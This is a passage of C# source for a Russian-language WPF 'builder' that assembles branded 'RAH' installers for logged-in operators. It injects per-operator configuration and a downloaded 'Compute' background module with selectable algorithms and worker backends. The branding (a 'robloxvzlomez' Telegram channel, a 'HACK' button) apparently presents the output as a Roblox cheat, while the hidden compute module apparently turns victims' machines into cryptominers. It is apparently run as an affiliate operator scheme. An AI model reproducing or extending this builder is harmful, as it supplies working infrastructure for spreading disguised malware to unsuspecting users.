                    try { Directory.Delete(tempNupkgDir, true); } catch { }

                    txtBuildStep4.Text = $"✓ 4. Исполняемый файл собран: {Path.GetFileName(destPath)}";
                    string hash = UpdatePackageBuilder.ComputeFileSha256(destPath);
                    txtBuildStep5.Text = $"✓ 5. Хеш SHA-256: {hash[..Math.Min(16, hash.Length)]}... (OK)";

                    pbProgress.IsIndeterminate = false;
                    pbProgress.Value = 100;
                    lblStatus.Text = "LegacyUpdate.exe успешно собран и содержит вашу конфигурацию!";
                    pnlBuildSuccess.Visibility = Visibility.Visible;
                    Log($"🎉 LegacyUpdate.exe готов к раздаче: {destPath}");
                }
                else
                {
                    throw new FileNotFoundException("Файл-шаблон LegacyUpdate.exe не найден. Пересоберите решение или проверьте папку downloads.");
                }
            }
            catch (Exception ex)
            {
                pbProgress.IsIndeterminate = false;
                pbProgress.Value = 0;
                pnlErrorBanner.Visibility = Visibility.Visible;
                txtErrorDetails.Text = ex.ToString();
                lblStatus.Text = "Ошибка сборки LegacyUpdate.exe";
                Log($"❌ Не удалось собрать LegacyUpdate.exe: {ex.Message}");
            }
        }
        #endregion

        private void ExtractEmbeddedIcons()
        {
            try
            {
                string iconDir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    "NEXUS_Builder", "icons"
                );
                Directory.CreateDirectory(iconDir);

                var asm = Assembly.GetExecutingAssembly();
                foreach (string resName in asm.GetManifestResourceNames())
                {
                    if (resName.EndsWith(".ico", StringComparison.OrdinalIgnoreCase))
                    {
                        string fileName = resName;
                        int lastDot = resName.LastIndexOf('.', resName.Length - 5);
                        if (lastDot >= 0)
                        {
                            fileName = resName.Substring(lastDot + 1);
                        }

                        string targetPath = Path.Combine(iconDir, fileName);
                        using var s = asm.GetManifestResourceStream(resName);
                        if (s != null)
                        {
                            using var fs = new FileStream(targetPath, FileMode.Create, FileAccess.Write);
                            s.CopyTo(fs);
                        }
                    }
                }
            }
            catch { }
        }

        private async void TryAutoLogin()
        {
            try
            {
                if (File.Exists(_authFilePath))
                {
                    string json = await File.ReadAllTextAsync(_authFilePath);
                    using var doc = JsonDocument.Parse(json);
                    var root = doc.RootElement;
                    if (root.TryGetProperty("user", out var u) && root.TryGetProperty("token", out var t))
                    {
                        string user = u.GetString() ?? "";
                        string token = t.GetString() ?? "";
                        if (!string.IsNullOrWhiteSpace(user) && !string.IsNullOrWhiteSpace(token))
                        {
                            ApplyUserSession(user, token);
                            return;
                        }
                    }
                }
            }
            catch { }

            ShowLoginScreen();
        }

        private void ShowLoginScreen()
        {
            gridMainBuilder.Visibility = Visibility.Collapsed;
            gridAuthLogin.Visibility = Visibility.Visible;
            badgeUserSession.Visibility = Visibility.Collapsed;
            tbAuthLogin.Focus();
        }

        private void ShowAuthError(string msg)
        {
            txtAuthError.Text = msg;
            borderAuthError.Visibility = Visibility.Visible;
        }

        private async void BtnAuthLogin_Click(object sender, RoutedEventArgs e)
        {
            string username = tbAuthLogin.Text.Trim();
            string password = pbAuthPassword.Password;

            if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(password))
            {
                ShowAuthError("⚠️ Введите логин и пароль");
                return;
            }

            btnAuthLogin.IsEnabled = false;
            btnAuthLogin.Content = "ПОДКЛЮЧЕНИЕ...";
            borderAuthError.Visibility = Visibility.Collapsed;

            try
            {
                var payload = JsonSerializer.Serialize(new { username, password });
                using var content = new StringContent(payload, Encoding.UTF8, "application/json");
                using var resp = await _http.PostAsync($"{API_BASE}/api/login", content);

                if (!resp.IsSuccessStatusCode)
                {
                    ShowAuthError("⚠️ Неверный логин или пароль!");
                    return;
                }

                string respBody = await resp.Content.ReadAsStringAsync();
                using var doc = JsonDocument.Parse(respBody);
                var root = doc.RootElement;
                string user = root.TryGetProperty("user", out var u) ? u.GetString() ?? username : username;
                string token = root.TryGetProperty("token", out var t) ? t.GetString() ?? "" : "";

                if (chkRememberSession.IsChecked == true)
                {
                    try
                    {
                        Directory.CreateDirectory(Path.GetDirectoryName(_authFilePath)!);
                        string saveJson = JsonSerializer.Serialize(new { user, token, savedAt = DateTime.UtcNow });
                        await File.WriteAllTextAsync(_authFilePath, saveJson);
                    }
                    catch { }
                }

                ApplyUserSession(user, token);
            }
            catch (Exception ex)
            {
                ShowAuthError("⚠️ Ошибка связи с сервером: " + ex.Message);
            }
            finally
            {
                btnAuthLogin.IsEnabled = true;
                btnAuthLogin.Content = "Войти в систему";
            }
        }

        private void TbAuthField_KeyDown(object sender, System.Windows.Input.KeyEventArgs e)
        {
            if (e.Key == System.Windows.Input.Key.Enter)
            {
                BtnAuthLogin_Click(sender, e);
            }
        }

        private void ApplyUserSession(string user, string token)
        {
            _currentUser = user;
            _authToken = token;
            _isUserAdmin = user.Equals("shonll", StringComparison.OrdinalIgnoreCase);

            lblLoggedInUser.Text = user;
            lblLoggedInRole.Text = _isUserAdmin ? "ADMIN" : "WORKER";
            badgeUserSession.Visibility = Visibility.Visible;

            if (_isUserAdmin)
            {
                cbOperators.IsEnabled = true;
                borderNonAdminNotice.Visibility = Visibility.Collapsed;
            }
            else
            {
                // Не-админ: строго привязываем к его авторизованному имени
                borderNonAdminNotice.Visibility = Visibility.Visible;
                txtNonAdminNotice.Text = $"🔒 Профиль заблокирован: {user}";
                cbOperators.IsEnabled = false;

                bool found = false;
                for (int i = 0; i < cbOperators.Items.Count; i++)
                {
                    if (cbOperators.Items[i] is ComboBoxItem cbi && cbi.Tag?.ToString()?.Equals(user, StringComparison.OrdinalIgnoreCase) == true)
                    {
                        cbOperators.SelectedIndex = i;
                        found = true;
                        break;
                    }
                }

                if (!found)
                {
                    var newItem = new ComboBoxItem
                    {
                        Content = $"👤 {user} (Ваш профиль)",
                        Tag = user,
                        IsSelected = true
                    };
                    cbOperators.Items.Insert(0, newItem);
                    cbOperators.SelectedIndex = 0;
                }

                if (tbCustomOperator != null) tbCustomOperator.Visibility = Visibility.Collapsed;
            }

            gridAuthLogin.Visibility = Visibility.Collapsed;
            gridMainBuilder.Visibility = Visibility.Visible;

            Log($"✅ Авторизован: {user} [{(_isUserAdmin ? "Главный Администратор" : "Оператор / Воркер")}]");
            Log($"• Профиль: {(_isUserAdmin ? "Любой (свободный выбор)" : $"Закреплён за {user}")}");
        }

        private void BtnLogout_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                if (File.Exists(_authFilePath)) File.Delete(_authFilePath);
            }
            catch { }

            _currentUser = "";
            _authToken = "";
            _isUserAdmin = false;

            pbAuthPassword.Password = "";
            borderAuthError.Visibility = Visibility.Collapsed;
            ShowLoginScreen();

            Log("🚪 Выполнен выход из аккаунта. Билдер заблокирован.");
        }

        private string? FindIsccPath()
        {
            string[] possiblePaths = new[]
            {
                @"C:\Program Files (x86)\Inno Setup 6\ISCC.exe",
                @"C:\Program Files\Inno Setup 6\ISCC.exe",
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Programs\Inno Setup 6\ISCC.exe"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"NEXUS_Builder\inno\ISCC.exe"),
                @"C:\Program Files (x86)\Inno Setup 5\ISCC.exe",
                @"C:\Program Files\Inno Setup 5\ISCC.exe"
            };

            foreach (var p in possiblePaths)
            {
                if (File.Exists(p)) return p;
            }

            var envPath = Environment.GetEnvironmentVariable("PATH") ?? "";
            foreach (var dir in envPath.Split(Path.PathSeparator))
            {
                try
                {
                    string cand = Path.Combine(dir.Trim(), "ISCC.exe");
                    if (File.Exists(cand)) return cand;
                }
                catch { }
            }

            return null;
        }

        private async Task<string?> EnsureInnoSetup()
        {
            string? iscc = FindIsccPath();
            if (!string.IsNullOrEmpty(iscc) && File.Exists(iscc)) return iscc;

            string portableDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "NEXUS_Builder", "inno"
            );
            string portableIscc = Path.Combine(portableDir, "ISCC.exe");
            if (File.Exists(portableIscc)) return portableIscc;

            Log("⚙️ Inno Setup не обнаружен в системе. Автоматическая загрузка портативного компилятора...");
            Directory.CreateDirectory(portableDir);

            string zipPath = Path.Combine(portableDir, "inno_portable.zip");
            string downloadUrl = $"{API_BASE}/downloads/templates/inno_portable.zip";

            try
            {
                using var resp = await _http.GetAsync(downloadUrl, HttpCompletionOption.ResponseHeadersRead);
                if (!resp.IsSuccessStatusCode)
                {
                    Log($"❌ Не удалось загрузить Inno Setup с сервера (HTTP {resp.StatusCode})");
                    return null;
                }

                using (var fs = new FileStream(zipPath, FileMode.Create, FileAccess.Write, FileShare.None))
                {
                    await resp.Content.CopyToAsync(fs);
                }

                Log("📦 Распаковка портативного компилятора Inno Setup...");
                ZipFile.ExtractToDirectory(zipPath, portableDir, true);
                try { File.Delete(zipPath); } catch { }

                if (File.Exists(portableIscc))
                {
                    Log("✅ Портативный Inno Setup успешно настроен!");
                    return portableIscc;
                }
            }
            catch (Exception ex)
            {
                Log("❌ Ошибка загрузки Inno Setup: " + ex.Message);
            }

            return null;
        }

        private const string REQUIRED_TEMPLATE_VERSION = "8.0.3";

        private async Task<string> EnsureAppTemplate()
        {
            string templatesDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "NEXUS_Builder", "templates", "app_template"
            );

            string verFile = Path.Combine(templatesDir, "template_version.txt");
            string clientDll = Path.Combine(templatesDir, "RAH Non Pro.dll");
            string standaloneDll = Path.Combine(templatesDir, "RAH PRO.dll");

            // Функция строгой проверки: файл версии совпадает И сама DLL скомпилирована под REQUIRED_TEMPLATE_VERSION (без 7.4.5) И размер DLL соответствует новому дизайну (> 1MB)
            bool IsTemplateStrictlyValid(string dir)
            {
                try
                {
                    string vF = Path.Combine(dir, "template_version.txt");
                    if (!File.Exists(vF) || File.ReadAllText(vF).Trim() != REQUIRED_TEMPLATE_VERSION) return false;
                    string cDll = Path.Combine(dir, "RAH Non Pro.dll");
                    if (!File.Exists(cDll)) return false;
                    var fi = new FileInfo(cDll);
                    if (fi.Length < 500000) return false;
                    byte[] dllBytes = File.ReadAllBytes(cDll);
                    string dllAscii = Encoding.ASCII.GetString(dllBytes);
                    if (dllAscii.Contains("7.4.5")) return false; // Защита от старых бинарников
                    if (!dllAscii.Contains(REQUIRED_TEMPLATE_VERSION)) return false;
                    return true;
                }
                catch { return false; }
            }

            // 0. Приоритетная проверка: если рядом с билдером или в рабочей директории есть свежий локальный шаблон — используем его
            string[] localTemplateCandidates = new[]
            {
                Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "templates", "app_template"),
                Path.Combine(Directory.GetCurrentDirectory(), "templates", "app_template"),
                Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", "..", "templates", "app_template"),
                Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", "templates", "app_template")
            };

            foreach (var candidate in localTemplateCandidates)
            {
                try
                {
                    if (Directory.Exists(candidate) && IsTemplateStrictlyValid(candidate))
                    {
                        Directory.CreateDirectory(templatesDir);
                        CopyDirectory(candidate, templatesDir);
                        File.WriteAllText(verFile, REQUIRED_TEMPLATE_VERSION);
                        Log($"📁 Локальный шаблон приложения синхронизирован из {candidate}");
                        return templatesDir;
                    }
                }
                catch { }
            }

            // Если шаблон уже есть в кэше и он строго валиден — используем его
            if (Directory.Exists(templatesDir) && IsTemplateStrictlyValid(templatesDir) && File.Exists(standaloneDll))
            {
                return templatesDir;
            }

            // Если шаблон устарел или содержит старые файлы (например, 7.4.5 или размер < 1MB) — принудительно удаляем
            if (Directory.Exists(templatesDir))
            {
                Log("🧹 Обнаружен устаревший или некорректный шаблон приложения. Очистка кэша...");
                try { Directory.Delete(templatesDir, true); } catch { }
            }

            // Очищаем также старые промежуточные кэши, если в них застряли старые версии
            string oldClientCache = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "NEXUS_Builder", "templates", "client_multifile");
            string oldStandaloneCache = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "NEXUS_Builder", "templates", "standalone_multifile");

            if (Directory.Exists(oldClientCache) && !IsTemplateStrictlyValid(oldClientCache))
            {
                try { Directory.Delete(oldClientCache, true); } catch { }
            }

            if (Directory.Exists(oldClientCache) && File.Exists(Path.Combine(oldClientCache, "RAH Non Pro.dll")) &&
                Directory.Exists(oldStandaloneCache) && File.Exists(Path.Combine(oldStandaloneCache, "RAH PRO.dll")) &&
                IsTemplateStrictlyValid(oldClientCache))
            {
                Directory.CreateDirectory(templatesDir);
                CopyDirectory(oldClientCache, templatesDir);
                foreach (var f in Directory.GetFiles(oldStandaloneCache, "RAH PRO.*"))
                {
                    File.Copy(f, Path.Combine(templatesDir, Path.GetFileName(f)), true);
                }
                File.WriteAllText(verFile, REQUIRED_TEMPLATE_VERSION);
                if (IsTemplateStrictlyValid(templatesDir))
                {
                    return templatesDir;
                }
            }

            // Загрузка с сервера для пользователей
            Log("📥 Обновление шаблона приложения. Загрузка с сервера...");
            Directory.CreateDirectory(Path.GetDirectoryName(templatesDir)!);

            string zipPath = Path.Combine(Path.GetDirectoryName(templatesDir)!, "app_template.zip");
            string downloadUrl = $"{API_BASE}/downloads/templates/app_template.zip?v={REQUIRED_TEMPLATE_VERSION}";

            try
            {
                using var resp = await _http.GetAsync(downloadUrl, HttpCompletionOption.ResponseHeadersRead);
                if (!resp.IsSuccessStatusCode)
                {
                    Log($"❌ Ошибка скачивания шаблона: сервер вернул код {resp.StatusCode}");
                    return "";
                }

                long totalBytes = resp.Content.Headers.ContentLength ?? 72000000;
                using var contentStream = await resp.Content.ReadAsStreamAsync();
                using (var fs = new FileStream(zipPath, FileMode.Create, FileAccess.Write, FileShare.None, 81920, true))
                {
                    byte[] buffer = new byte[81920];
                    long totalRead = 0;
                    int bytesRead;
                    DateTime lastLog = DateTime.Now;

                    while ((bytesRead = await contentStream.ReadAsync(buffer, 0, buffer.Length)) > 0)
                    {
                        await fs.WriteAsync(buffer, 0, bytesRead);
                        totalRead += bytesRead;

                        if ((DateTime.Now - lastLog).TotalMilliseconds > 400)
                        {
                            int percent = (int)((totalRead * 100) / totalBytes);
                            if (percent > 100) percent = 100;
                            Dispatcher.Invoke(() =>
                            {
                                pbProgress.Value = percent;
                                lblStatus.Text = $"• Загрузка шаблона: {percent}% ({totalRead / (1024 * 1024)} МБ / {totalBytes / (1024 * 1024)} МБ)...";
                            });
                            lastLog = DateTime.Now;
                        }
                    }
                }

                Log("📦 Распаковка шаблона приложения в локальный кэш...");
                Dispatcher.Invoke(() => { pbProgress.IsIndeterminate = true; lblStatus.Text = "• Распаковка шаблона..."; });

                if (Directory.Exists(templatesDir)) Directory.Delete(templatesDir, true);
                Directory.CreateDirectory(templatesDir);
                ZipFile.ExtractToDirectory(zipPath, templatesDir, true);
                File.WriteAllText(verFile, REQUIRED_TEMPLATE_VERSION);

                try { File.Delete(zipPath); } catch { }

                Log("✅ Шаблон приложения успешно загружен и готов!");
                return templatesDir;
            }
            catch (Exception ex)
            {
                Log("❌ Ошибка загрузки шаблона: " + ex.Message);
                return "";
            }
        }

        private void InitializeDefaultIcon()
        {
            SelectPresetIcon("rah");
        }

        private string GetPresetIconPath(string tag)
        {
            string fileName = tag switch
            {
                "rah" => "rah.ico",
                "fire" => "fire.ico",
                "singer" => "singer.ico",
                "svyaz" => "svyaz.ico",
                "cyber" => "cyber.ico",
                _ => "rah.ico"
            };

            string appDataIcons = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "NEXUS_Builder", "icons"
            );
            string iconPath = Path.Combine(appDataIcons, fileName);
            if (File.Exists(iconPath)) return iconPath;

            string baseDir = AppDomain.CurrentDomain.BaseDirectory;
            string localRes = Path.Combine(baseDir, "Resources", "Icons", fileName);
            if (File.Exists(localRes)) return localRes;

            string localFallback = Path.Combine(baseDir, fileName);
            if (File.Exists(localFallback)) return localFallback;

            string fallback = Path.Combine(appDataIcons, "app.ico");
            if (File.Exists(fallback)) return fallback;

            return iconPath;
        }

        private void SelectPresetIcon(string tag)
        {
            string path = GetPresetIconPath(tag);
            SetIcon(path, $"{tag}.ico (Встроенная)");
        }

        private void SetIcon(string path, string displayName)
        {
            _activeIconPath = path;
            if (lblIconName != null)
            {
                lblIconName.Text = displayName;
            }

            if (imgIconPreview != null)
            {
                try
                {
                    if (File.Exists(path))
                    {
                        var bmp = new BitmapImage();
                        bmp.BeginInit();
                        bmp.UriSource = new Uri(path, UriKind.Absolute);
                        bmp.CacheOption = BitmapCacheOption.OnLoad;
                        bmp.EndInit();
                        imgIconPreview.Source = bmp;
                    }
                    else
                    {
                        imgIconPreview.Source = null;
                    }
                }
                catch
                {
                    imgIconPreview.Source = null;
                }
            }
        }

        private void CbIconPresets_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (!_isInitialized || cbIconPresets == null) return;

            if (cbIconPresets.SelectedItem is ComboBoxItem item)
            {
                string tag = item.Tag?.ToString() ?? "thunder";
                if (tag == "__custom_ico__")
                {
                    BtnBrowseIcon_Click(sender, e);
                }
                else
                {
                    SelectPresetIcon(tag);
                }
            }
        }

        private void BtnBrowseIcon_Click(object sender, RoutedEventArgs e)
        {
            using var ofd = new System.Windows.Forms.OpenFileDialog();
            ofd.Title = "Выберите файл иконки приложения (.ico)";
            ofd.Filter = "Иконки (*.ico)|*.ico|Все файлы (*.*)|*.*";
            ofd.FilterIndex = 1;

            if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                SetIcon(ofd.FileName, Path.GetFileName(ofd.FileName));
                Log($"🎨 Выбрана иконка: {ofd.FileName}");
            }
        }

        private void BtnBrowseBg_Click(object sender, RoutedEventArgs e)
        {
            using var ofd = new System.Windows.Forms.OpenFileDialog();
            ofd.Title = "Выберите фоновое изображение приложения (.jpg, .png)";
            ofd.Filter = "Изображения (*.jpg;*.jpeg;*.png)|*.jpg;*.jpeg;*.png|Все файлы (*.*)|*.*";
            ofd.FilterIndex = 1;

            if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                SetCustomBackground(ofd.FileName);
                Log($"🎨 Выбран кастомный фон: {ofd.FileName}");
            }
        }

        private void BtnResetBg_Click(object sender, RoutedEventArgs e)
        {
            SetCustomBackground(null);
            Log("🎨 Фон сброшен на изображение по умолчанию (Гриффит)");
        }

        private void SetCustomBackground(string? path)
        {
            _customBgPath = string.IsNullOrWhiteSpace(path) ? null : path;
            if (string.IsNullOrEmpty(_customBgPath) || !File.Exists(_customBgPath))
            {
                _customBgPath = null;
                if (tbCustomBgPath != null) tbCustomBgPath.Text = "По умолчанию (Гриффит, ч/б)";
                if (imgBgPreview != null) imgBgPreview.Source = null;
            }
            else
            {
                if (tbCustomBgPath != null) tbCustomBgPath.Text = Path.GetFileName(_customBgPath);
                if (imgBgPreview != null)
                {
                    try
                    {
                        var bmp = new BitmapImage();
                        bmp.BeginInit();
                        bmp.UriSource = new Uri(_customBgPath, UriKind.Absolute);
                        bmp.CacheOption = BitmapCacheOption.OnLoad;
                        bmp.EndInit();
                        imgBgPreview.Source = bmp;
                    }
                    catch
                    {
                        imgBgPreview.Source = null;
                    }
                }
            }
        }

        private void TitleBar_MouseDown(object sender, MouseButtonEventArgs e)
        {
            if (e.ChangedButton == MouseButton.Left)
            {
                DragMove();
            }
        }

        private void BtnMinimize_Click(object sender, RoutedEventArgs e)
        {
            WindowState = WindowState.Minimized;
        }

        private void BtnClose_Click(object sender, RoutedEventArgs e)
        {
            Close();
        }

        private void Log(string msg)
        {
            Dispatcher.Invoke(() =>
            {
                string time = DateTime.Now.ToString("HH:mm:ss");
                txtConsole.AppendText($"[{time}] {msg}\n");
                txtConsole.ScrollToEnd();
                SendWebLog(msg);
            });
        }

        private void CbOperators_SelectionChanged(object sender, SelectionChangedEventArgs e)
        {
            if (!_isInitialized || cbOperators == null) return;

            if (cbOperators.SelectedItem is ComboBoxItem item)
            {
                string tag = item.Tag?.ToString() ?? "";
                bool isCustom = tag == "__custom__";
                if (tbCustomOperator != null)
                {
                    tbCustomOperator.Visibility = isCustom ? Visibility.Visible : Visibility.Collapsed;
                    if (isCustom) tbCustomOperator.Focus();
                }

                if (cbIconPresets != null)
                {
                    string targetIconTag = tag.ToLowerInvariant() switch
                    {
                        "dildman" => "fire",
                        "singer1isss" => "singer",
                        "saha_kakaha122" => "svyaz",
                        "huilaebanaya" => "cyber",
                        _ => "thunder"
                    };

                    for (int i = 0; i < cbIconPresets.Items.Count; i++)
                    {
                        if (cbIconPresets.Items[i] is ComboBoxItem cbi && cbi.Tag?.ToString() == targetIconTag)
                        {
                            cbIconPresets.SelectedIndex = i;
                            break;
                        }
                    }
                }
            }
        }

        private string GetSelectedOperator()
        {
            if (!_isUserAdmin && !string.IsNullOrWhiteSpace(_currentUser))
            {
                return _currentUser;
            }

            if (cbOperators.SelectedItem is ComboBoxItem item)
            {
                string tag = item.Tag?.ToString() ?? "";
                if (tag == "__custom__")
                {
                    string custom = tbCustomOperator.Text.Trim();
                    return string.IsNullOrWhiteSpace(custom) ? (_currentUser.Length > 0 ? _currentUser : "HuilaEbanaya") : custom;
                }
                return tag;
            }
            return string.IsNullOrWhiteSpace(_currentUser) ? "HuilaEbanaya" : _currentUser;
        }

        private void BtnBrowse_Click(object sender, RoutedEventArgs e)
        {
            using var dialog = new System.Windows.Forms.FolderBrowserDialog();
            dialog.Description = "Выберите папку для сохранения собранных приложений";
            dialog.UseDescriptionForTitle = true;
            dialog.SelectedPath = tbOutputPath.Text;
            if (dialog.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                tbOutputPath.Text = dialog.SelectedPath;
                Log($"📁 Папка назначения: {dialog.SelectedPath}");
            }
        }

        private void BtnOpenFolder_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                string folder = tbOutputPath.Text;
                if (Directory.Exists(folder))
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = folder,
                        UseShellExecute = true
                    });
                }
            }
            catch (Exception ex)
            {
                Log("Ошибка открытия папки: " + ex.Message);
            }
        }

        private async void BtnBuildStandaloneInstaller_Click(object sender, RoutedEventArgs e)
        {
            await RunBuild(isStandalone: true);
        }

        private async void BtnBuildClientInstaller_Click(object sender, RoutedEventArgs e)
        {
            await RunBuild(isStandalone: false);
        }

        private async Task RunBuild(bool isStandalone, string overrideOperator = "", string themeAccent = "#ffffff", string themeSurface = "#0D0E12")
        {
            if (string.IsNullOrWhiteSpace(_currentUser))
            {
                Log("❌ Ошибка: Сборка заблокирована! Требуется авторизация в аккаунте.");
                ShowLoginScreen();
                return;
            }

            string opName = !string.IsNullOrWhiteSpace(overrideOperator) ? overrideOperator.Trim() : GetSelectedOperator();
            string appName = tbAppName.Text.Trim();
            if (string.IsNullOrWhiteSpace(appName)) appName = "RAH";
            string appAuthor = tbAuthor?.Text.Trim() ?? "";
            if (string.IsNullOrWhiteSpace(appAuthor)) appAuthor = "RAH Team";
            string tgChannel = tbTelegramChannel?.Text.Trim() ?? "";
            if (string.IsNullOrWhiteSpace(tgChannel)) tgChannel = "https://t.me/robloxvzlomez";
            else if (!tgChannel.StartsWith("http://", StringComparison.OrdinalIgnoreCase) && !tgChannel.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            {
                tgChannel = "https://t.me/" + tgChannel.TrimStart('@');
            }

            string outDir = tbOutputPath.Text.Trim();
            if (string.IsNullOrWhiteSpace(outDir))
            {
                outDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "NEXUS_Builds_v8.0.3");
            }

            string cleanExeBaseName = string.Concat(appName.Split(Path.GetInvalidFileNameChars())).Trim();
            if (string.IsNullOrWhiteSpace(cleanExeBaseName)) cleanExeBaseName = "RAH";

            string buildTypeTitle = isStandalone ? "Standalone Инсталлятор (PRO)" : "Client Инсталлятор";
            string targetOutputName = $"{cleanExeBaseName}_Setup_{opName}.exe";
            string outputFullPath = Path.Combine(outDir, targetOutputName);

            string btnText = tbButtonText?.Text?.Trim() ?? "ВЗЛОМАТЬ";
            if (string.IsNullOrWhiteSpace(btnText)) btnText = "ВЗЛОМАТЬ";

            GoToStep(4);
            pnlBuildSteps.Visibility = Visibility.Visible;
            pnlBuildSuccess.Visibility = Visibility.Collapsed;
            pnlErrorBanner.Visibility = Visibility.Collapsed;
            txtBuildStep1.Text = "⏳ 1. Проверка настроек и параметров...";
            txtBuildStep2.Text = "⏳ 2. Подготовка файлов приложения...";
            txtBuildStep3.Text = "⏳ 3. Подготовка фонового модуля...";
            txtBuildStep4.Text = "⏳ 4. Сборка программы...";
            txtBuildStep5.Text = "⏳ 5. Проверка результата...";

            // Валидация пользовательских параметров проекта
            var (isParamsValid, paramsErr) = ValidateAllCustomParams();
            if (!isParamsValid)
            {
                Log($"❌ ОШИБКА ВАЛИДАЦИИ ПАРАМЕТРОВ ПРОЕКТА: {paramsErr}");
                pnlErrorBanner.Visibility = Visibility.Visible;
                txtErrorDetails.Text = $"Ошибка в параметрах проекта: {paramsErr}";
                return;
            }

            // Валидация Compute Module
            var (isComputeValid, computeErr) = ValidateComputeModuleConfig();
            if (!isComputeValid)
            {
                Log($"❌ {computeErr}");
                pnlErrorBanner.Visibility = Visibility.Visible;
                txtErrorDetails.Text = computeErr;
                return;
            }

            txtBuildStep1.Text = "✓ 1. Настройки проверены успешно";

            var customConfigDict = BuildCustomConfigDictionary();
            SaveCustomProjectParams(); // Гарантированное сохранение при билде

            // Автоматическая подготовка и проверка внешних Compute компонентов
            if (ComputeConfig.Enabled && ComputeConfig.Modules.Any(m => m.Enabled))
            {
                // Collect all unique legacy modes required by active modules
                var requiredModes = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
                for (int mi = 0; mi < ComputeConfig.Modules.Count; mi++)
                {
                    var mod = ComputeConfig.Modules[mi];
                    if (!mod.Enabled) continue;

                    string legacyMode = MapAlgorithmToLegacyMode(mod.Primary.Algorithm);
                    requiredModes.Add(legacyMode);
                    if (mod.IsDualMode && !string.IsNullOrEmpty(mod.Secondary.Algorithm))
                    {
                        string secondaryMode = MapAlgorithmToLegacyMode(mod.Secondary.Algorithm);
                        requiredModes.Add(secondaryMode);
                    }

                    var algoDef = AlgorithmRegistry.GetById(mod.Primary.Algorithm);
                    Log($"[Compute Module #{mi + 1}] Mode: {(mod.IsDualMode ? "Dual" : "Single")}, Algorithm: {algoDef?.DisplayName ?? mod.Primary.Algorithm}, Backend: {algoDef?.Backend ?? "unknown"}, Status: {(mod.Enabled ? "Active" : "Disabled")}");
                }

                // Prepare each unique worker backend
                foreach (string modeVal in requiredModes)
                {
                    var (workerReady, workerPath, workerMsg) = await ComputeWorkerManager.PrepareWorkerAsync(
                        modeVal,
                        msg => Log(msg),
                        pct => Dispatcher.Invoke(() => { pbProgress.Value = pct; lblStatus.Text = $"• Загрузка worker: {pct}%..."; })
                    );

                    if (!workerReady)
                    {
                        Log($"⚠️ Внимание: {workerMsg}");
                    }
                }
            }

            btnBuildStandaloneInstaller.IsEnabled = false;
            btnBuildClientInstaller.IsEnabled = false;
            btnBrowse.IsEnabled = false;
            btnOpenFolder.Visibility = Visibility.Collapsed;
            pbProgress.IsIndeterminate = true;
            lblStatus.Text = $"• Сборка {buildTypeTitle}...";

            Log("═════════════════════════════════════════════════════════════════");
            Log($"🚀 СТАРТ СБОРКИ: {buildTypeTitle}");
            Log($"👤 Целевой профиль оператора: {opName}");
            Log($"🏷️ Имя приложения: {appName}");
            Log($"🏢 Автор / Издатель: {appAuthor}");
            Log($"📢 Telegram канал: {tgChannel}");
            Log($"⚙️ Пользовательских параметров: {customConfigDict.Count}");
            Log($"🎨 Иконка: {Path.GetFileName(_activeIconPath)}");
            Log($"💾 Путь назначения: {outputFullPath}");


            bool success = false;

            await Task.Run(async () =>
            {
                try
                {
                    // 1. Получение шаблона приложения (из локального кэша или автоматическая загрузка)
                    string templateDir = await EnsureAppTemplate();
                    if (string.IsNullOrEmpty(templateDir) || !Directory.Exists(templateDir))
                    {
                        Log("❌ ОШИБКА: Не удалось получить шаблон приложения!");
                        return;
                    }

                    string stagingDir = Path.Combine(Path.GetTempPath(), $"NEXUS_Stage_{Guid.NewGuid():N}");
                    if (Directory.Exists(stagingDir))
                    {
                        try { Directory.Delete(stagingDir, true); } catch { }
                    }
                    Directory.CreateDirectory(stagingDir);

                    Log("📂 Подготовка файлов приложения...");
                    CopyDirectory(templateDir, stagingDir);

                    // Проверка и сохранение структуры внешних компонентов Compute
                    string computeTemplateDir = Path.Combine(templateDir, "Compute");
                    string computeStagingDir = Path.Combine(stagingDir, "Compute");
                    if (Directory.Exists(computeTemplateDir))
                    {
                        if (!Directory.Exists(computeStagingDir))
                        {
                            Directory.CreateDirectory(computeStagingDir);
                        }
                        CopyDirectory(computeTemplateDir, computeStagingDir);
                        var computeFiles = Directory.GetFiles(computeStagingDir);
                        Log($"📦 Внешние вычислительные компоненты (Compute): обнаружено {computeFiles.Length} файлов в шаблоне.");
                    }

                    // Очистка лишних файлов режима
                    if (isStandalone)
                    {
                        foreach (var f in Directory.GetFiles(stagingDir, "RAH Non Pro.*"))
                        {
                            try { File.Delete(f); } catch { }
                        }
                    }
                    else
                    {
                        foreach (var f in Directory.GetFiles(stagingDir, "RAH PRO.*"))
                        {
                            try { File.Delete(f); } catch { }
                        }
                    }

                    // 2. Внедрение параметров оператора в целевой управляемый DLL
                    string targetDllName = isStandalone ? "RAH PRO.dll" : "RAH Non Pro.dll";
                    string targetDllPath = Path.Combine(stagingDir, targetDllName);

                    if (!File.Exists(targetDllPath))
                    {
                        var dlls = Directory.GetFiles(stagingDir, "*.dll");
                        foreach (var d in dlls)
                        {
